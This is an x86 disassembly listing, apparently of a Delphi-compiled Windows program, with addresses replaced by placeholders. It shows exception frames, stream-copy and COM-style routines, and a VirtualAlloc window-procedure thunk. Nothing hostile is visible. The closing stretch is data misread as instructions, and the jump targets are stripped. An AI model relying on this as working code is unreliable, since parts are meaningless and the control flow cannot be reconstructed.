push esi
mov eax [ ebx + 0x20 ]
push eax
mov eax [ eax ]
call [ eax ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_403348
test al al
je r-xdata
mov eax 0x80004002
jmp r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41b134
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_41b158
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403264
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_41b1a0
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403284
test bl bl
jle r-xdata
mov edx esi
call sub_41b3d0
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_41b208
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x10 ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_41b3d0
mov edx ebx
mov eax esi
call sub_41b3c4
sub_41b24c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41a944
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ esi + 0x50 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
retn
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_41b290
push ebx
push esi
push edi
call sub_403608
mov ebx edx
mov edi eax
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41a990
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
mov esi [ edi + 0x50 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx edi
call sub_41ac44
jmp r-xdata
mov eax esi
call sub_414258
mov edx eax
mov eax edi
call sub_41b3d0
lea eax [ edi + 0x50 ]
call sub_40d19c
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035f0
sub_41b2f0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_41ac60
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x30 ]
jne r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
sub_41b31c
push ebx
cmp [ eax + 0x42 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov al 0x1
pop ebx
retn
sub_41b338
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
mov al 0x1
pop ebx
retn
sub_41b354
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x40 ]
jne r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x44 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x40 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx edi
mov eax [ ebx + 0x50 ]
call sub_414170
mov edx [ eax ]
call [ edx + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_41b3d0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
xor eax eax
mov [ ebp + 0x10 ] eax
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_414060
jmp r-xdata
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_414170
cmp ebp eax
jne r-xdata
sub_41b410
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x30 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_41ac44
mov edx ebx
call sub_41aa14
sub_41b43c
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403264
mov [ edi + 0xc ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x10 ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_41b484
push ebx
push esi
call sub_403608
mov ebx edx
mov esi eax
cmp [ esi + 0x10 ] 0x1
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403284
test bl bl
jle r-xdata
mov eax [ esi + 0xc ]
call sub_403294
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4035f0
sub_41b4bc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_41b50b
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41b524
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_41b573
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41b58c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_41b5f6
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov ebx 0x80030001
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp ebx 0x2
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ esi + 0xc ]
mov ecx ebx
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_41b610
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_41b659
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebx + 0xc ]
call sub_4166b0
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ ebp + 0x10 ]
jne r-xdata
je r-xdata
cmp eax [ ebp + 0xc ]
xor ebx ebx
mov ebx 0x80004005
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_41b674
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
call sub_405700
xor eax eax
push ebp
push sub_41b861
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
xor edx edx
push ebp
push sub_41b83a
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x100000
jbe r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x100000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_4026e4
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41b829
push [ fs : edx ]
mov [ fs : edx ] esp
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
ja r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_402704
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x4 ] edx
mov esi [ ebp + 0x10 ]
mov esi 0x7fffffff
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4 ] edx
cmp esi [ ebp - 0xc ]
jle r-xdata
test esi esi
jle r-xdata
mov eax esi
mov eax [ ebp - 0xc ]
jmp r-xdata
mov eax ebx
cdq
add [ ebp - 0x18 ] eax
adc [ ebp - 0x14 ] edx
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
add [ ebp - 0x20 ] eax
adc [ ebp - 0x1c ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_403ab4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc ]
xchg ecx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b868
lea eax [ ebp + 0xc ]
call sub_40568c
retn
sub esi ebx
mov eax ebx
cdq
sub [ ebp + 0x10 ] eax
sbb [ ebp + 0x14 ] edx
test esi esi
jg r-xdata
call sub_403ab4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x80004005
sub_41b8a4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor esi esi
xor eax eax
push ebp
push sub_41b907
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0x4 ] 0x2
mov eax [ edi + 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x18 ] eax
xor eax eax
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x20 ] eax
xor eax eax
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41b938
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_414534
mov edi eax
xor eax eax
push ebp
push sub_41b98d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b994
mov eax [ rw-data ]
call sub_414598
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_414170
call sub_403294
inc esi
dec ebx
jne r-xdata
sub_41b9ac
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov edx esp
mov eax [ ecx + 0x4 ]
call [ ecx ]
add esp 0xc
pop eax
pop ebp
retn 0x10
sub_41b9d4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi ]
mov ebx [ edi ]
mov edx [ ebx + 0x5 ]
mov [ edi ] edx
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x5 ] edx
mov edx [ ebp + 0xc ]
mov [ ebx + 0x9 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x40
push 0x1000
push 0x1000
push 0x0
call VirtualAlloc
mov esi eax
mov eax [ rw-data ]
mov [ esi ] eax
lea edx [ esi + 0x4 ]
mov eax rw-data
mov ecx 0x2
call sub_4028e0
mov edx sub_41b9ac
lea eax [ esi + 0x5 ]
call sub_41b9cc
mov [ esi + 0x6 ] eax
lea ebx [ esi + 0xa ]
mov [ ebx ] 0xe8
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_41b9cc
mov [ ebx + 0x1 ] eax
mov eax [ edi ]
mov [ ebx + 0x5 ] eax
mov [ edi ] ebx
add ebx 0xd
mov eax ebx
sub eax esi
cmp eax 0xffc
jl r-xdata
mov [ rw-data ] esi
sub_41ba90
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov eax [ rw-data ]
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test al al
je r-xdata
mov edx DefWindowProcA
cmp edx [ ebp - 0x24 ]
je r-xdata
push rw-data
call RegisterClassA
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call UnregisterClassA
push 0x80000000
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov ecx r-xdata
mov edx [ rw-data ]
mov eax 0x80
call sub_406a34
mov ebx eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41b9d4
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
sub_41bb44
push ebx
push esi
mov esi eax
push 0xfffffffc
push esi
call GetWindowLongA
mov ebx eax
push esi
call DestroyWindow
cmp ebx DefWindowProcA
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_41ba6c
sub_41bb6c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41bc10
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bc17
retn
mov eax [ rw-data ]
call sub_413960
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
call sub_41b938
xor edx edx
xor eax eax
call sub_4175b0
mov eax rw-data
call sub_40d19c
call sub_405dbc
lea eax [ eax + 0xc ]
call sub_40d19c
mov eax rw-data
call sub_40d19c
mov eax rw-data
call sub_40568c
mov eax sub_41b9a4
call sub_405528
mov eax rw-data
call sub_40d19c
call sub_41a1ac
mov eax rw-data
call sub_40d19c
mov eax rw-data
call sub_40568c
sub_41bc1c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41bca5
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bcac
retn
call sub_41a178
mov eax sub_41b9a4
call sub_405520
mov dl 0x1
mov eax [ r-xdata ]
call sub_40cedc
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
call sub_4056a4
mov dl 0x1
mov eax [ r-xdata ]
call sub_413228
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4143dc
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4143dc
mov [ rw-data ] eax
sub edx 0xffffffd4
sub_41bcb0
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edi + edi * 8 - 0x599c0000 ] cl
inc edi
add [ ebp + 0x640000ff ] cl
cmpsb [ esi ] [ edi ]
inc edi
add [ esi + 0x640000ff ] cl
cmpsb [ esi ] [ edi ]
inc edi
add [ edi + 0x640000ff ] cl
cmpsb [ esi ] [ edi ]
inc edi
add [ eax - 0x1 ] dh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ ecx - 0x1 ] dh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edx - 0x1 ] dh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ ebx - 0x1 ] dh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edi + edi * 8 ] dh
add [ esi + 0x47 ] ah
add [ ebp - 0x1 ] dh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ esi - 0x1 ] dh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edi - 0x1 ] dh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ eax - 0x1 ] bh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ ecx - 0x1 ] bh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edx - 0x1 ] bh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ ebx - 0x1 ] bh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edi + edi * 8 ] bh
add [ esi + 0x47 ] ah
add [ ebp - 0x1 ] bh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ esi - 0x1 ] bh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edi - 0x1 ] bh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ eax - 0x1 ] ah
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ ecx - 0x1 ] ah
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edx - 0x1 ] ah
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ ebx - 0x1 ] ah
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edi + edi * 8 ] ah
add [ esi + 0x47 ] ah
add [ ebp - 0x1 ] ah
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ esi - 0x1 ] ah
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edi - 0x1 ] ah
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ eax - 0x1 ] ch
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ ecx - 0x1 ] ch
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edx - 0x1 ] ch
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ ebx - 0x1 ] ch
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edi + edi * 8 ] ch
add [ esi + 0x47 ] ah
add [ ebp - 0x1 ] ch
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ esi - 0x1 ] ch
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edi - 0x1 ] ch
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ eax - 0x1 ] dl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ ecx - 0x1 ] dl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edx - 0x1 ] dl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ ebx - 0x1 ] dl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edi + edi * 8 ] dl
add [ esi + 0x47 ] ah
add [ ebp - 0x1 ] dl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ esi - 0x1 ] dl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edi - 0x1 ] dl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ eax - 0x1 ] bl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ ecx - 0x1 ] bl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edx - 0x1 ] bl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ ebx - 0x1 ] bl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edi + edi * 8 ] bl
add [ esi + 0x47 ] ah
add [ ebp - 0x1 ] bl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ esi - 0x1 ] bl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edi - 0x1 ] bl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ eax - 0x1 ] al
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ ecx - 0x1 ] al
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edx - 0x1 ] al
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ ebx - 0x1 ] al
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edi + edi * 8 ] al
add [ esi + 0x47 ] ah
add [ ebp - 0x1 ] al
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ esi - 0x1 ] al
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edi - 0x1 ] al
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ eax - 0x1 ] cl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ ecx - 0x1 ] cl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edx - 0x1 ] cl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ ebx - 0x1 ] cl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edi + edi * 8 ] cl
add [ esi + 0x47 ] ah
add [ ebp - 0x1 ] cl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ esi - 0x1 ] cl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ edi - 0x1 ] cl
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ eax ] dh
inc [ eax ]
add [ esi + 0x47 ] ah
add [ ecx ] dh
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edx ] dh
inc [ eax ]
add [ esi + 0x47 ] ah
add [ ebx ] dh
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edi + edi * 8 ] dh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ 0x640000ff ] dh
cmpsb [ esi ] [ edi ]
inc edi
add [ esi ] dh
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edi ] dh
inc [ eax ]
add [ esi + 0x47 ] ah
add [ eax ] bh
inc [ eax ]
add [ esi + 0x47 ] ah
add [ ecx ] bh
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edx ] bh
inc [ eax ]
add [ esi + 0x47 ] ah
add [ ebx ] bh
inc [ eax ]
add [ esi + 0x47 ] ah
add [ edi + edi * 8 ] bh
add [ eax ] al
cmpsb [ fs : esi ] [ edi ]
inc edi
add [ 0x550000ff ] bh
mov ebp esp
xor eax eax
push ebp
push sub_41bf65
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bf6c
retn
sub_41bf7a
inc ecx
add [ ecx ] al
push es
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
lea eax [ eax ]
fdivr [ edi + 0x41 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fdivr [ edi + 0xc0041 ]
add [ eax ] al
je r-xdata
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x45180040 ] al
dec ecx
outsb
jbe r-xdata
inc eax
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x450f0040 ] al
dec ecx
outsb
jbe r-xdata
inc esi
outsd
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ edi + 0x70 ] cx
jb r-xdata
popad
jo r-xdata
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ eax ] di
rol [ ecx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
rol [ ecx ] 0xc
add [ eax ] al
add [ edi + ebp * 2 + 0x40 ] dh
add ah al
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al bl
xor al 0x40
add ah cl
jae r-xdata
popad
insd
nop
lodsb [ esi ]
rol [ ecx ] 0x1
or al 0x54
inc esi
push esp
je r-xdata
imul esp [ ebx + 0x4f ] 0x61726570
jae r-xdata
outsb
jb r-xdata
push 0x65737261
je r-xdata
outsd
outsb
lea eax [ eax ]
pop eax
rol [ ecx ] 0x3
or dl [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edi ] cl
add [ eax ] al
add [ ecx + eax * 8 + 0x70070041 ] dl
insd
outsd
insb
imul esp [ esi + eax + 0x70 ] 0x73614473
push 0x44737005
outsd
je r-xdata
imul ebp [ esi + 0x65 ] 0x5373660b
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
inc [ eax ]
add [ eax ] al
nop
enter 0x41c0 0x0
outsd
outsb
je r-xdata
imul esi [ ebx + 0x68 ] 0x1
add [ edx ] al
add [ eax ] al
add [ eax + eax * 8 + 0x41 ] dl
add [ ecx ] cl
jo r-xdata
insd
push edi
push 0x5657469
jo r-xdata
or al 0x70
jae r-xdata
jo r-xdata
pop es
jo r-xdata
jo r-xdata
imul ebp [ ebx + 0x65 ] 0x874754f
inc edi
jb r-xdata
jae r-xdata
je r-xdata
je r-xdata
popa
jne r-xdata
